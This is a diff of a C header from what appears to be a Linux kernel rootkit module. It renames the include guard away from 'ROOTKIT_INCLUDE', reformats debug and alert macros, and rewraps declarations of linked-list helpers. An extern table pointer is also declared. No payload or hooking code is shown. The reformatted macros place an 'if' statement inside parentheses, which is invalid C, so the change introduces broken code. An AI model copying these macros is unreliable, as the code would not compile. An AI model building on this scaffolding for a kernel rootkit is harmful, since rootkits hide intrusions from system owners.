@@ -1,5 +1,5 @@
-#ifndef ROOTKIT_INCLUDE
-#define ROOTKIT_INCLUDE
+#ifndef INCLUDE_H
+#define INCLUDE_H
 
 #include <linux/kernel.h>
 #include <linux/module.h>
@@ -45,10 +45,8 @@ extern void **table_ptr;
  * maybe in the future: make list generic with #define
  */
 struct data_node {
-
 	/* pointer to data */
 	void *data;
-
 	/* list to previous and next entry */
 	struct data_node *prev, *next;
 };
@@ -60,8 +58,17 @@ struct data_node {
 /* debugger functions */
 
 /* variadic macro for debug messages */
-#define debug(str, ...) if (DEBUG_ENABLED) { pr_info("[ ROOTKIT_MODULE ] [ %s ] " str "\n", __func__, ##__VA_ARGS__); }
-#define alert(str, ...) if (DEBUG_ENABLED) { pr_warn("[ ROOTKIT_MODULE ] [ %s ] " str "\n", __func__, ##__VA_ARGS__); }
+#define debug(str, ...) 					\
+(if (DEBUG_ENABLED) {			 			\
+	pr_info("[ ROOTKIT_MODULE ] [ %s ] " str "\n", 		\
+		__func__, ##__VA_ARGS__); 			\
+})
+
+#define alert(str, ...) 					\
+(if (DEBUG_ENABLED) { 						\
+	pr_warn("[ ROOTKIT_MODULE ] [ %s ] " str "\n", 		\
+		__func__, ##__VA_ARGS__); 			\
+})
 
 /* list functions */
 
@@ -69,10 +76,12 @@ struct data_node {
 int is_empty_data_node(struct data_node **head);
 
 /* find node with specific content in data */
-struct data_node *find_data_node(struct data_node **head, void *data, int length);
+struct data_node *find_data_node(struct data_node **head, void *data, 
+	int length);
 
 /* find node with specific field in data (used for structs) */
-struct data_node *find_data_node_field(struct data_node **head, void *needle, int offset, int length);
+struct data_node *find_data_node_field(struct data_node **head, void *needle, 
+	int offset, int length);
 
 /* insert node at the end of the current list */
 struct data_node *insert_data_node(struct data_node **head, void *data);
@@ -81,13 +90,15 @@ struct data_node *insert_data_node(struct data_node **head, void *data);
 void delete_data_node(struct data_node **head, struct data_node *node);
 
 /* call a function for each node */
-void foreach_data_node_callback(struct data_node **head, void (*callback_function)(struct data_node *));
+void foreach_data_node_callback(struct data_node **head, 
+	void (*callback_function)(struct data_node *));
 
 /* completely free a list */
 void free_data_node_list(struct data_node **head);
 
 /* completely free a list with callback function */
-void free_data_node_list_callback(struct data_node **head, void (*callback_function)(struct data_node *));
+void free_data_node_list_callback(struct data_node **head, 
+	void (*callback_function)(struct data_node *));
 
 /* critical section functions (mutexes) */
 
